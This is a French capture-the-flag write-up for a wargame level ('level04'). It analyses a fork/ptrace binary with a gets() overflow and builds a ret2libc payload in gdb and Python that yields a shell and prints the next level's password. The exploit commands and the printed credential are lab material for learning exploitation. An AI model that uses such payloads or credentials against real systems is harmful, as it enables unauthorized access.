1) Transfert du fichier avec SCP en utilisant un port spécifié :
    scp -P 22222 level04@localhost:/home/users/level04/level04 .

2) Explications du code decompile:
    - Le programme utilise fork() pour générer un processus enfant qui demande à l'utilisateur d'entrer un shellcode.
    - Le processus parent utilise ptrace() pour surveiller l'enfant, cherchant l'utilisation de l'appel système execve() (représenté par le numéro 11 sur les systèmes Linux x86_64). 
      Cela permet au parent de détecter si l'enfant tente d'exécuter un nouveau programme.
    - Le processus enfant appelle prctl(PR_SET_PDEATHSIG, SIGKILL) pour s'assurer qu'il sera terminé (via un signal SIGKILL) si le processus parent meurt.
    - Si ptrace() détecte que l'enfant a tenté d'exécuter execve(), le processus parent termine immédiatement l'enfant avec SIGKILL.
    - Le processus enfant utilise la fonction gets() qui est vulnérable aux débordements de tampon
    - Malgré que ptrace() surveille l'execution de code par le processus enfant, on peut essayer d'y provoquer un débordement de tampon

3) - On utilise gdb, avec l'option "set follow-fork-mode" pour surveiller le comportement du processus enfant
   - On génere aussi un pattern avec le site https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html pour trouver notre offset

    gdb) set follow-fork-mode 
    Requires an argument. Valid arguments are child, parent.
    (gdb) set follow-fork-mode child
    (gdb) break main
    Breakpoint 1 at 0x80486cd
    (gdb) run
    Starting program: /home/users/level04/level04
    Breakpoint 1, 0x080486cd in main ()
    (gdb) continue
    Continuing.
    [New process 2123]
    Give me some shellcode, k
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
    Program received signal SIGSEGV, Segmentation fault.
    [Switching to process 2123]
    0x41326641 in ?? ()
    
    41326641 = A2fA = Af2A = Offset: 156

    - On cherche les adresses de system, exit et /bin/sh

    (gdb) p system
    $2 = {<text variable, no debug info>} 0xf7e6aed0 <system>
    (gdb) p exit
    $3 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
    (gdb) find __libc_start_main,+99999999,"/bin/sh"
    0xf7f897ec

    - On écrit notre charge utile : 
        python -c 'print "a" * 156 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/exploit04
    - On execute : 
        level04@OverRide:~$ cat /tmp/exploit04 - | ./level04 
        Give me some shellcode, k
        whoami
        level05
        cat /home/users/level05/.pass
        3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN


Ressources: 
    https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md#x86_64-64_bit
    ret2libc